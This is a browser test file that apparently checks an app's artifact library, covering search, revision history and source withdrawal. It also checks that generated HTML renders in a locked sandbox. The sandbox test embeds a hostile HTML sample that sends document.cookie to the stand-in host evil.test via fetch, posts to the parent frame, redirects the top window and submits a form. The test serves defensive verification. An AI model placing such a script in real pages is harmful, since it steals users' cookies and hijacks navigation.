import { afterAll, beforeAll, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import { chromium, type Browser, type BrowserContext } from "playwright-core";
import { composedFixture } from "./fixtures/s15-composition";
import type { FileUpload } from "../src/s16/files/types";
import { en } from "../src/i18n/en";
import { th } from "../src/i18n/th";

const browserTest = process.env.JIT_S16_BROWSER_TESTS === "1" ? test : test.skip;
let browser: Browser;
beforeAll(async () => { if (process.env.JIT_S16_BROWSER_TESTS === "1") browser = await chromium.launch({ executablePath: process.env.JIT_BROWSER_EXECUTABLE || "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", headless: true, args: ["--disable-background-networking", "--no-first-run"] }); });
afterAll(async () => { await browser?.close(); });
const hash = (text: string) => createHash("sha256").update(text).digest("hex");

async function fixture() {
  return composedFixture("default", false, undefined, options => {
    for (const rule of options.proposedPolicy!.rules) { if (!rule.adapters.includes("s16_files")) rule.adapters.push("s16_files"); if (!rule.operations.includes("artifact_create")) rule.operations.push("artifact_create"); }
    return { ...options, files: {} };
  });
}
type F = Awaited<ReturnType<typeof fixture>>;
/** Real upload → guarded read → committed artifact, through the same protected HTTP API the client uses. */
async function produce(f: F, output: { name: string; text: string }) {
  const notes = "Launch: Friday.\nOwner: Ana.\n";
  const created = await (await f.request("/api/s16/client/conversations/conversation/uploads", "POST", { requestId: "upload1", conversationId: "conversation", name: "notes.txt", bytes: Buffer.byteLength(notes), sha256: hash(notes) })).json() as FileUpload;
  const receipt = (await (await f.raw(`/api/s16/client/uploads/${created.id}/bytes`, notes)).json() as FileUpload).receipt!;
  f.script = [{ type: "tool_call", id: "read1", name: "file_read", arguments: { id: receipt.id, offset: 0 } }, { type: "tool_call", id: "create1", name: "file_create", arguments: output }];
  expect((await f.request("/api/s16/client/conversations/conversation/messages", "POST", { contract: "s16-conversation/v2", requestId: "message1", conversationId: "conversation", text: "Summarize these notes and create a downloadable Markdown brief.", continuation: null, files: [{ id: receipt.id, sha256: receipt.sha256 }] })).status).toBe(202);
  await f.service.conversation.drain(); f.advance(1000);
  return { receipt, artifact: f.service.conversation.view(f.owner, "message1").artifacts![0]! };
}
async function route(context: BrowserContext, f: F, external: string[], contexts: string[] = []) {
  await context.route("**/*", async routed => {
    const incoming = routed.request(), url = new URL(incoming.url());
    if (url.origin !== "http://localhost:3099") { external.push(incoming.url()); await routed.abort(); return; }
    const all = await incoming.allHeaders(), headers = { ...all, host: "localhost:3099" }, path = url.pathname + url.search;
    if (path.endsWith("/preview")) contexts.push(`${all["sec-fetch-dest"]}/${all["sec-fetch-site"]}/${all["sec-fetch-mode"]}`);
    const response = incoming.method() === "POST" ? await f.request(path, "POST", incoming.postDataJSON(), headers) : await f.request(path, incoming.method(), undefined, headers);
    await routed.fulfill({ status: response.status, headers: Object.fromEntries(response.headers), body: Buffer.from(await response.arrayBuffer()) });
  });
}

browserTest.each([1440, 390])("library search, provenance, explicit revise, revision history and withdrawal in the real bundle at width %i", async width => {
  const f = await fixture(), copy = width === 1440 ? en : th, fill = (key: keyof typeof en, values: Record<string, string | number>) => copy[key].replace(/\{(\w+)\}/g, (_, name: string) => String(values[name]));
  const context = await browser.newContext({ viewport: { width, height: 1000 }, locale: width === 1440 ? "en-US" : "th-TH" }), external: string[] = [], errors: string[] = [];
  context.setDefaultTimeout(10000); await route(context, f, external);
  const page = await context.newPage(); page.on("pageerror", error => errors.push(error.message));
  const noOverflow = () => page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth);
  try {
    const { receipt } = await produce(f, { name: "brief.md", text: "# Brief\nLaunch: Friday.\nOwner: Ana.\n" });
    await page.goto("http://localhost:3099/s16/artifacts");
    await page.getByRole("heading", { name: copy["s16.artifact.library"], exact: true }).waitFor();
    const row = page.getByRole("button", { name: fill("s16.artifact.open", { name: "brief.md" }), exact: true });
    await row.waitFor(); expect(await noOverflow()).toBe(true);
    await page.getByRole("searchbox", { name: copy["s16.artifact.search"] }).fill("nothing-here");
    await page.getByText(copy["s16.artifact.noResults"], { exact: true }).waitFor();
    await page.getByRole("searchbox", { name: copy["s16.artifact.search"] }).fill("BRIEF");
    await row.click();
    const dialog = page.getByRole("dialog"); await dialog.locator(".preview-text").waitFor();
    expect(await dialog.locator(".preview-text").textContent()).toBe("# Brief\nLaunch: Friday.\nOwner: Ana.\n");
    await dialog.getByText("notes.txt", { exact: false }).first().waitFor();
    expect(await dialog.locator("ol li").count()).toBe(1);
    await page.keyboard.press("Escape"); await page.waitForFunction(() => document.activeElement?.getAttribute("data-artifact-id") !== null);
    // Revise: adopts the exact bytes, opens the composer with an editable request, starts nothing.
    await row.click(); const calls = f.modelPrompts.length;
    await dialog.getByRole("button", { name: copy["s16.artifact.revise"], exact: true }).click();
    await page.waitForURL("**/s16/chat/conversation");
    const prompt = page.getByRole("textbox", { name: copy["s16.chat.prompt"], exact: true });
    await page.getByText(copy["s16.files.ready"], { exact: true }).waitFor();
    expect(await prompt.inputValue()).toBe(copy["s16.artifact.reviseStart"] + copy["s16.artifact.reviseEnd"]);
    await page.waitForFunction(() => document.activeElement?.id === "message");
    await page.keyboard.type(width === 1440 ? "keep only the launch line" : "เหลือเฉพาะบรรทัดวันเปิดตัว");
    expect(await prompt.inputValue()).toBe(copy["s16.artifact.reviseStart"] + (width === 1440 ? "keep only the launch line" : "เหลือเฉพาะบรรทัดวันเปิดตัว") + copy["s16.artifact.reviseEnd"]);
    expect(f.modelPrompts.length).toBe(calls);
    const adopted = f.service.files!.journal.all<FileUpload & { kind: string; origin?: unknown }>().find(entry => entry.kind === "upload" && entry.origin)!;
    f.script = [{ type: "tool_call", id: "read2", name: "file_read", arguments: { id: adopted.id, offset: 0 } }, { type: "tool_call", id: "create2", name: "file_create", arguments: { name: "brief-v2.md", text: "# Brief\nLaunch: Friday.\n" } }];
    await prompt.press("Enter");
    await page.getByRole("button", { name: fill("s16.artifact.preview", { name: "brief-v2.md" }), exact: true }).waitFor();
    // History: the new revision names its exact parent; the original bytes are unchanged.
    if (width === 390) await page.getByRole("button", { name: copy["s16.nav.more"], exact: true }).click();
    await page.getByRole("button", { name: copy["s16.nav.artifacts"], exact: true }).click();
    await page.waitForURL("**/s16/artifacts");
    await page.getByRole("button", { name: fill("s16.artifact.open", { name: "brief-v2.md" }), exact: true }).click();
    await dialog.locator(".preview-text").waitFor(); expect(await dialog.locator(".preview-text").textContent()).toBe("# Brief\nLaunch: Friday.\n");
    await dialog.getByText(fill("s16.artifact.revision", { n: 2 }), { exact: false }).first().waitFor();
    await dialog.getByRole("button", { name: new RegExp(fill("s16.artifact.revision", { n: 1 })) }).last().click();
    await page.waitForFunction(text => document.querySelector(".inspector .preview-text")?.textContent === text, "# Brief\nLaunch: Friday.\nOwner: Ana.\n");
    expect(page.url()).toMatch(/\/s16\/artifacts\/artifact_[a-f0-9]{32}$/);
    await page.reload(); await dialog.locator(".preview-text").waitFor();
    expect(await noOverflow()).toBe(true);
    // Withdrawing the original source closes the open preview and empties the library.
    await f.request(`/api/s16/client/uploads/${receipt.id}/withdraw`, "POST", {});
    await page.getByText(copy["s16.artifact.libraryEmpty"], { exact: true }).waitFor({ timeout: 15000 });
    expect(await page.locator(".inspector .preview-text").count()).toBe(0);
    expect(errors).toEqual([]); expect(external).toEqual([]); expect(f.vmCalls).toEqual([]);
  } finally { await context.close(); await f.close(); }
}, 60000);

browserTest("an HTML artifact renders static in an opaque sandbox: no scripts, cookies, network, forms, navigation or parent messages", async () => {
  const f = await fixture(), context = await browser.newContext({ viewport: { width: 1440, height: 1000 }, locale: "en-US" }), external: string[] = [], errors: string[] = [], contexts: string[] = [];
  // A real loopback server, so the service sees the request context headers Chrome actually sends.
  const server = Bun.serve({ hostname: "localhost", port: 3099, async fetch(request) {
    const url = new URL(request.url), path = url.pathname + url.search, headers: Record<string, string> = { ...Object.fromEntries(request.headers), host: "localhost:3099" };
    if (path.endsWith("/preview")) contexts.push(`${headers["sec-fetch-dest"]}/${headers["sec-fetch-site"]}/${headers["sec-fetch-mode"]}`);
    return request.method === "POST" ? f.request(path, "POST", await request.json(), headers) : f.request(path, request.method, undefined, headers);
  } });
  context.setDefaultTimeout(10000);
  await context.route("**/*", async routed => { if (new URL(routed.request().url()).origin === "http://localhost:3099") { await routed.continue(); return; } external.push(routed.request().url()); await routed.abort(); });
  const page = await context.newPage(); page.on("pageerror", error => errors.push(error.message));
  await page.addInitScript(() => { Reflect.set(window, "jitMessages", []); addEventListener("message", event => (Reflect.get(window, "jitMessages") as unknown[]).push(String(event.data))); });
  const html = `<!doctype html><html><head><title>static</title><meta http-equiv="refresh" content="0;url=http://evil.test/refresh"><link rel="stylesheet" href="http://evil.test/x.css"><style>#p{color:rgb(1, 2, 3)}</style></head><body><p id="p">Launch: Friday.</p>
<script>document.title="ran";parent.postMessage("pwned","*");fetch("http://evil.test/fetch?"+document.cookie);top.location="http://evil.test/top"</script>
<img src="http://evil.test/pixel.png"><iframe src="http://evil.test/frame"></iframe><a id="out" href="http://evil.test/nav">out</a><a id="top" target="_top" href="http://evil.test/top-link">top</a><a id="blank" target="_blank" href="http://evil.test/popup">popup</a>
<form action="http://evil.test/form" method="post"><input name="q" value="secret"><button id="submit">Send</button></form></body></html>`;
  try {
    const { artifact } = await produce(f, { name: "brief.html", text: html });
    await page.goto(`http://localhost:3099/s16/artifacts/${artifact.id}`);
    const frameElement = page.locator("iframe.artifact-frame"); await frameElement.waitFor();
    expect(await frameElement.getAttribute("sandbox")).toBe("");
    const frame = page.frameLocator("iframe.artifact-frame");
    await frame.locator("#p").waitFor();
    const content = page.frames().find(item => item.url().endsWith("/preview"))!;
    expect(await content.evaluate(() => getComputedStyle(document.getElementById("p")!).color)).toBe("rgb(1, 2, 3)");
    expect(await content.evaluate(() => document.title)).toBe("static");
    expect(await content.evaluate(() => { try { return document.cookie; } catch { return "denied"; } })).toBe("denied");
    expect(await content.evaluate(() => { try { return String(parent.document.title); } catch { return "denied"; } })).toBe("denied");
    expect(await content.evaluate(() => origin)).toBe("null");
    for (const id of ["#out", "#top", "#blank", "#submit"]) await frame.locator(id).click({ timeout: 2000 }).catch(() => {});
    await page.waitForTimeout(800);
    expect(external).toEqual([]); expect(page.url()).toBe(`http://localhost:3099/s16/artifacts/${artifact.id}`); expect(context.pages()).toHaveLength(1);
    expect(page.frames().some(item => item.url().includes("evil.test"))).toBe(false);
    expect(await page.evaluate(() => Reflect.get(window, "jitMessages"))).toEqual([]);
    expect(new Set(contexts)).toEqual(new Set(["iframe/same-origin/navigate"]));
    expect(errors).toEqual([]);
  } finally { await context.close(); await server.stop(true); await f.close(); }
}, 60000);
